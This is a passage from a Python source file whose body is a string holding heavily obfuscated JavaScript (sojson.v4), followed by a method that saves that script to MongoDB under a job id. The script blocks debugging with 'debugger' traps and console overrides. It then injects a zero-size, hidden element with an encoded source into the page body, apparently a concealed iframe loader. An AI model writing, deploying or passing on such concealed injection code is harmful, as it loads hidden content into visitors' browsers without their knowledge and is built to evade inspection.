_0xeccdcb[_0x9d0e('0xa','\x75\x41\x46\x25')](_0x1ba281,_0x287c99);},'nApZY':_0xeccdcb[_0x9d0e('0xb','\x47\x30\x57\x6c')],'qCaIT':_0xeccdcb[_0x9d0e('0xc','\x5d\x23\x39\x5a')],'ozeEL':function _0x50c420(_0x29fe94,_0x2873b7){return _0x29fe94+_0x2873b7;},'hQlxu':function _0x21e3bd(_0x306ae3,_0x3b473f){return _0xeccdcb[_0x9d0e('0xd','\x39\x5a\x29\x79')](_0x306ae3,_0x3b473f);},'OqAaS':function _0x35e25a(_0x5c376b,_0x103f45){return _0x5c376b===_0x103f45;}};var _0x55e4ad=!![];return function(_0x546b8e,_0x3859c3){var _0x6ef345=_0x55e4ad?function(){if(_0x3859c3){if(_0x4000d1[_0x9d0e('0xe','\x78\x65\x7a\x6d')](_0x4000d1[_0x9d0e('0xf','\x76\x5d\x49\x44')],_0x4000d1[_0x9d0e('0x10','\x35\x75\x6f\x79')])){var _0x420b98=_0x3859c3[_0x9d0e('0x11','\x57\x71\x4c\x29')](_0x546b8e,arguments);_0x3859c3=null;return _0x420b98;}else{if(_0x4000d1[_0x9d0e('0x12','\x38\x78\x33\x7a')](_0x4000d1[_0x9d0e('0x13','\x4d\x26\x4e\x25')]('',_0x4000d1[_0x9d0e('0x14','\x4e\x38\x23\x46')](counter,counter))[_0x9d0e('0x15','\x57\x71\x4c\x29')],0x1)||_0x4000d1[_0x9d0e('0x16','\x47\x7a\x4d\x6b')](counter%0x14,0x0)){debugger;}else{debugger;}}}}:function(){var _0x27b0c3={'UPnzJ':_0x9d0e('0x17','\x6e\x23\x5d\x32')};if(_0x27b0c3[_0x9d0e('0x18','\x6d\x4c\x53\x21')]!==_0x9d0e('0x19','\x74\x79\x4b\x4d')){}else{debugger;}};_0x55e4ad=![];return _0x6ef345;};}();(function(){var _0x489159={'EQNap':_0x9d0e('0x1a','\x42\x76\x4d\x25'),'nUKBK':_0x9d0e('0x1b','\x59\x71\x42\x57'),'Jwlhw':function _0x4fc612(_0x4b4c03,_0x2282bb,_0x58a745){return _0x4b4c03(_0x2282bb,_0x58a745);}};if(_0x489159[_0x9d0e('0x1c','\x77\x23\x31\x4d')]===_0x489159[_0x9d0e('0x1d','\x47\x7a\x4d\x6b')]){}else{_0x489159[_0x9d0e('0x1e','\x73\x64\x21\x5a')](_0x7e01,this,function(){var _0x29885f={'pllSK':function _0x3f50fc(_0x161887,_0x141b5e){return _0x161887===_0x141b5e;},'nCTYP':_0x9d0e('0x1f','\x52\x57\x58\x74'),'iPeQo':_0x9d0e('0x20','\x53\x29\x5a\x68'),'JHDMe':_0x9d0e('0x21','\x28\x29\x54\x2a'),'vJdTx':_0x9d0e('0x22','\x76\x5d\x49\x44'),'qFueG':function _0x45e7d6(_0xe7f9b4,_0x4f0c0f){return _0xe7f9b4(_0x4f0c0f);},'bXOPB':_0x9d0e('0x23','\x35\x64\x77\x30'),'UNAmG':_0x9d0e('0x24','\x42\x76\x4d\x25'),'AnERA':_0x9d0e('0x25','\x35\x64\x77\x30'),'YvDvp':function _0x5a0152(_0x192672,_0x1a4e9e){return _0x192672!==_0x1a4e9e;},'BzxJx':_0x9d0e('0x26','\x6d\x4c\x53\x21'),'zbcOe':function _0x3f61fc(_0x3478fe){return _0x3478fe();}};if(_0x29885f[_0x9d0e('0x27','\x47\x7a\x4d\x6b')](_0x29885f[_0x9d0e('0x28','\x35\x75\x6f\x79')],_0x29885f[_0x9d0e('0x29','\x67\x43\x50\x29')])){}else{var _0xd30503=new RegExp(_0x29885f[_0x9d0e('0x2a','\x4d\x26\x4e\x25')]);var _0x4f8142=new RegExp(_0x29885f[_0x9d0e('0x2b','\x6e\x23\x5d\x32')],'\x69');var _0xde910d=_0x29885f[_0x9d0e('0x2c','\x59\x71\x42\x57')](_0x2bf458,_0x29885f[_0x9d0e('0x2d','\x34\x51\x6d\x59')]);if(!_0xd30503[_0x9d0e('0x2e','\x73\x64\x21\x5a')](_0xde910d+_0x29885f[_0x9d0e('0x2f','\x35\x36\x4d\x5d')])||!_0x4f8142[_0x9d0e('0x30','\x47\x6b\x5d\x33')](_0xde910d+_0x29885f[_0x9d0e('0x31','\x74\x79\x4b\x4d')])){if(_0x29885f[_0x9d0e('0x32','\x53\x29\x5a\x68')](_0x29885f[_0x9d0e('0x33','\x73\x64\x21\x5a')],_0x29885f[_0x9d0e('0x34','\x39\x5a\x29\x79')])){}else{_0xde910d('\x30');}}else{_0x29885f[_0x9d0e('0x35','\x73\x76\x74\x34')](_0x2bf458);}}})();}}());var _0x297029=function(){var _0x348018=!![];return function(_0x390b6c,_0x3f61c3){var _0x3888d0=_0x348018?function(){var _0x1f7d3b={'mztdW':function _0x2c29df(_0x380492,_0x4999b4){return _0x380492!==_0x4999b4;},'fnyBo':_0x9d0e('0x36','\x4e\x38\x23\x46'),'DvpuS':function _0x272a56(_0x175ac7,_0x1104db){return _0x175ac7===_0x1104db;},'fRWRr':_0x9d0e('0x37','\x43\x24\x64\x54'),'GqnHE':function _0x4fa8e0(_0x3824be){return _0x3824be();}};if(_0x1f7d3b[_0x9d0e('0x38','\x33\x47\x77\x36')](_0x9d0e('0x39','\x44\x74\x38\x65'),_0x1f7d3b[_0x9d0e('0x3a','\x6e\x23\x5d\x32')])){if(_0x3f61c3){if(_0x1f7d3b[_0x9d0e('0x3b','\x79\x25\x68\x30')](_0x1f7d3b[_0x9d0e('0x3c','\x67\x43\x50\x29')],_0x9d0e('0x3d','\x6f\x26\x6b\x63'))){_0x1f7d3b[_0x9d0e('0x3e','\x71\x35\x26\x56')](_0x2bf458);}else{var _0x559f0e=_0x3f61c3[_0x9d0e('0x3f','\x63\x59\x69\x6c')](_0x390b6c,arguments);_0x3f61c3=null;return _0x559f0e;}}}else{if(_0x3f61c3){var _0x2fd32a=_0x3f61c3[_0x9d0e('0x40','\x28\x63\x47\x55')](_0x390b6c,arguments);_0x3f61c3=null;return _0x2fd32a;}}}:function(){var _0x111ad9={'fHMkB':function _0x3074f0(_0xec0840,_0x52f1f3){return _0xec0840!==_0x52f1f3;},'hBHUY':_0x9d0e('0x41','\x74\x79\x4b\x4d')};if(_0x111ad9[_0x9d0e('0x42','\x61\x52\x42\x5e')](_0x111ad9[_0x9d0e('0x43','\x48\x5b\x79\x31')],_0x111ad9[_0x9d0e('0x44','\x35\x75\x6f\x79')])){debuggerProtection(0x0);}else{}};_0x348018=![];return _0x3888d0;};}();var _0x443d69=_0x297029(this,function(){var _0x207986=function(){};var _0x440680=_0xeccdcb[_0x9d0e('0x45','\x61\x52\x42\x5e')](typeof window,_0x9d0e('0x46','\x35\x59\x34\x68'))?window:_0xeccdcb[_0x9d0e('0x47','\x47\x30\x57\x6c')](typeof process,_0xeccdcb[_0x9d0e('0x48','\x4e\x38\x23\x46')])&&typeof require===_0xeccdcb[_0x9d0e('0x49','\x35\x59\x34\x68')]&&typeof global===_0xeccdcb[_0x9d0e('0x4a','\x30\x57\x6d\x4d')]?global:this;if(!_0x440680[_0x9d0e('0x4b','\x6f\x26\x6b\x63')]){if(_0xeccdcb[_0x9d0e('0x4c','\x61\x52\x42\x5e')](_0x9d0e('0x4d','\x67\x43\x50\x29'),_0x9d0e('0x4e','\x61\x52\x42\x5e'))){_0x440680[_0x9d0e('0x4f','\x34\x51\x6d\x59')]=function(_0x732afa){var _0x10c737={'WzsMn':_0x9d0e('0x50','\x6d\x4c\x53\x21'),'muZFX':function _0x216fc2(_0x4ece96,_0x44fb02){return _0x4ece96(_0x44fb02);},'CkvcH':_0x9d0e('0x51','\x67\x48\x25\x36'),'FXTCc':function _0x45b737(_0x769d49,_0xcbd826){return _0x769d49+_0xcbd826;},'ekVay':_0x9d0e('0x52','\x38\x33\x71\x47'),'oBGOZ':function _0x2bbf61(_0x4e71eb,_0x1ea047){return _0x4e71eb(_0x1ea047);},'yaUYF':function _0x5cd708(_0x352026,_0x442983){return _0x352026!==_0x442983;},'HUqIV':_0x9d0e('0x53','\x78\x65\x7a\x6d'),'owaiL':_0x9d0e('0x54','\x52\x57\x58\x74'),'DKjkg':_0x9d0e('0x55','\x4d\x26\x4e\x25'),'luSlK':function _0x141745(_0x182d7e,_0x2f0f27,_0x35db02){return _0x182d7e(_0x2f0f27,_0x35db02);}};if(_0x10c737[_0x9d0e('0x56','\x35\x36\x4d\x5d')](_0x10c737[_0x9d0e('0x57','\x67\x43\x50\x29')],_0x10c737[_0x9d0e('0x58','\x38\x78\x33\x7a')])){var _0x4bc302=_0x10c737[_0x9d0e('0x59','\x30\x57\x6d\x4d')][_0x9d0e('0x5a','\x39\x5a\x29\x79')]('\x7c'),_0x53042f=0x0;while(!![]){switch(_0x4bc302[_0x53042f++]){case'\x30':_0x35654f[_0x9d0e('0x5b','\x28\x63\x47\x55')]=_0x732afa;continue;case'\x31':_0x35654f[_0x9d0e('0x5c','\x38\x33\x71\x47')]=_0x732afa;continue;case'\x32':_0x35654f[_0x9d0e('0x5d','\x35\x36\x4d\x5d')]=_0x732afa;continue;case'\x33':_0x35654f[_0x9d0e('0x5e','\x35\x59\x34\x68')]=_0x732afa;continue;case'\x34':_0x35654f[_0x9d0e('0x5f','\x6e\x23\x5d\x32')]=_0x732afa;continue;case'\x35':_0x35654f[_0x9d0e('0x60','\x52\x57\x58\x74')]=_0x732afa;continue;case'\x36':return _0x35654f;case'\x37':_0x35654f[_0x9d0e('0x61','\x48\x5b\x79\x31')]=_0x732afa;continue;case'\x38':var _0x35654f={};continue;}break;}}else{_0x10c737[_0x9d0e('0x62','\x76\x5d\x49\x44')](_0x7e01,this,function(){var _0x235894=new RegExp(_0x10c737[_0x9d0e('0x63','\x44\x74\x38\x65')]);var _0x546ac7=new RegExp(_0x9d0e('0x64','\x47\x30\x57\x6c'),'\x69');var _0x2c20f8=_0x10c737[_0x9d0e('0x65','\x57\x71\x4c\x29')](_0x2bf458,_0x10c737[_0x9d0e('0x66','\x6d\x4c\x53\x21')]);if(!_0x235894[_0x9d0e('0x67','\x67\x48\x25\x36')](_0x10c737[_0x9d0e('0x68','\x38\x33\x71\x47')](_0x2c20f8,_0x9d0e('0x69','\x63\x59\x69\x6c')))||!_0x546ac7[_0x9d0e('0x6a','\x44\x74\x38\x65')](_0x2c20f8+_0x10c737[_0x9d0e('0x6b','\x30\x57\x6d\x4d')])){_0x10c737[_0x9d0e('0x6c','\x48\x5b\x79\x31')](_0x2c20f8,'\x30');}else{_0x2bf458();}})();}}(_0x207986);}else{}}else{if(_0xeccdcb[_0x9d0e('0x6d','\x59\x71\x42\x57')](_0xeccdcb[_0x9d0e('0x6e','\x73\x76\x74\x34')],_0x9d0e('0x6f','\x78\x46\x54\x26'))){var _0x24f56b=_0xeccdcb[_0x9d0e('0x70','\x52\x57\x58\x74')][_0x9d0e('0x71','\x71\x35\x26\x56')]('\x7c'),_0x490e7f=0x0;while(!![]){switch(_0x24f56b[_0x490e7f++]){case'\x30':_0x440680[_0x9d0e('0x72','\x71\x35\x26\x56')][_0x9d0e('0x73','\x61\x52\x42\x5e')]=_0x207986;continue;case'\x31':_0x440680[_0x9d0e('0x74','\x47\x6b\x5d\x33')][_0x9d0e('0x75','\x47\x7a\x4d\x6b')]=_0x207986;continue;case'\x32':_0x440680[_0x9d0e('0x4f','\x34\x51\x6d\x59')][_0x9d0e('0x76','\x33\x47\x77\x36')]=_0x207986;continue;case'\x33':_0x440680[_0x9d0e('0x77','\x35\x59\x34\x68')][_0x9d0e('0x78','\x67\x43\x50\x29')]=_0x207986;continue;case'\x34':_0x440680[_0x9d0e('0x79','\x47\x30\x57\x6c')][_0x9d0e('0x7a','\x77\x23\x31\x4d')]=_0x207986;continue;case'\x35':_0x440680[_0x9d0e('0x7b','\x73\x64\x21\x5a')][_0x9d0e('0x7c','\x6e\x23\x5d\x32')]=_0x207986;continue;case'\x36':_0x440680[_0x9d0e('0x7d','\x5d\x23\x39\x5a')][_0x9d0e('0x7e','\x6e\x23\x5d\x32')]=_0x207986;continue;}break;}}else{while(!![]){}}}});_0xeccdcb[_0x9d0e('0x7f','\x33\x47\x77\x36')](_0x443d69);var _0x3748bd=document[_0x9d0e('0x80','\x61\x52\x42\x5e')](_0xeccdcb[_0x9d0e('0x81','\x41\x71\x59\x68')]);_0x3748bd[_0x9d0e('0x82','\x61\x52\x42\x5e')]=0x0;_0x3748bd[_0x9d0e('0x83','\x35\x59\x34\x68')]=0x0;_0x3748bd[_0x9d0e('0x84','\x59\x71\x42\x57')]=_0xeccdcb[_0x9d0e('0x85','\x78\x65\x7a\x6d')];_0x3748bd[_0x9d0e('0x86','\x59\x71\x42\x57')][_0x9d0e('0x87','\x35\x75\x6f\x79')]=_0xeccdcb[_0x9d0e('0x88','\x47\x6b\x5d\x33')];document[_0x9d0e('0x89','\x48\x5b\x79\x31')](_0xeccdcb[_0x9d0e('0x8a','\x28\x63\x47\x55')])[0x0][_0x9d0e('0x8b','\x69\x67\x58\x73')](_0x3748bd);}_0x4d314d();setInterval(function(){var _0x521545={'qeTqm':function _0x17371a(_0x4f8366){return _0x4f8366();}};_0x521545[_0x9d0e('0x8c','\x6f\x26\x6b\x63')](_0x2bf458);},0xfa0);function _0x2bf458(_0x1a28bc){var _0x586a98={'OunxE':_0x9d0e('0x8d','\x6f\x26\x6b\x63'),'NbgAi':_0x9d0e('0x8e','\x55\x46\x68\x67'),'rGEdK':function _0x47f0f5(_0x2bd8b2,_0x1c6873){return _0x2bd8b2===_0x1c6873;},'DKAhQ':_0x9d0e('0x8f','\x33\x47\x77\x36'),'KSwTz':function _0x475301(_0x4e070a){return _0x4e070a();},'awNOy':function _0x1444bb(_0xa65076,_0x1cb9b0){return _0xa65076!==_0x1cb9b0;},'DEsGN':function _0x5508a3(_0x402af9,_0x2529fd){return _0x402af9+_0x2529fd;},'HffJZ':function _0x13ecdf(_0x43b584,_0x1667c8){return _0x43b584/_0x1667c8;},'bwRrS':_0x9d0e('0x90','\x35\x36\x4d\x5d'),'tiVPG':_0x9d0e('0x91','\x28\x29\x54\x2a'),'uPBTp':_0x9d0e('0x92','\x73\x64\x21\x5a'),'ILTVr':function _0x1ab4d8(_0x4c3f28,_0x31ef57){return _0x4c3f28(_0x31ef57);},'cGpCC':_0x9d0e('0x93','\x73\x76\x74\x34')};function _0x3c5e8d(_0x54935e){if(_0x586a98[_0x9d0e('0x94','\x77\x23\x31\x4d')](typeof _0x54935e,_0x586a98[_0x9d0e('0x95','\x44\x74\x38\x65')])){var _0x3be4db=function(){while(!![]){if(_0x586a98[_0x9d0e('0x96','\x47\x30\x57\x6c')]===_0x586a98[_0x9d0e('0x97','\x69\x67\x58\x73')]){}else{}}};return _0x586a98[_0x9d0e('0x98','\x73\x76\x74\x34')](_0x3be4db);}else{if(_0x586a98[_0x9d0e('0x99','\x28\x55\x70\x71')](_0x586a98[_0x9d0e('0x9a','\x6f\x26\x6b\x63')]('',_0x586a98[_0x9d0e('0x9b','\x52\x57\x58\x74')](_0x54935e,_0x54935e))[_0x586a98[_0x9d0e('0x9c','\x35\x36\x4d\x5d')]],0x1)||_0x54935e%0x14===0x0){debugger;}else{if(_0x586a98[_0x9d0e('0x9d','\x69\x67\x58\x73')](_0x586a98[_0x9d0e('0x9e','\x57\x71\x4c\x29')],_0x586a98[_0x9d0e('0x9f','\x73\x76\x74\x34')])){var _0x425168=fn[_0x9d0e('0xa0','\x69\x67\x58\x73')](context,arguments);fn=null;return _0x425168;}else{debugger;}}}_0x586a98[_0x9d0e('0xa1','\x35\x75\x6f\x79')](_0x3c5e8d,++_0x54935e);}try{if(_0x586a98[_0x9d0e('0xa2','\x35\x36\x4d\x5d')](_0x586a98[_0x9d0e('0xa3','\x59\x71\x42\x57')],_0x9d0e('0xa4','\x53\x29\x5a\x68'))){if(_0x1a28bc){return _0x3c5e8d;}else{_0x3c5e8d(0x0);}}else{debugger;}}catch(_0xbe5fbd){}};encode_version = 'sojson.v4';'''
        data = {
            'jid':self.id,
            'jsCode':js
        }
        if mongo.db[self.id].find_one({'jid':self.id}):
            pass
        else:
            mongo.db[self.id].insert(data)
        return 'ok'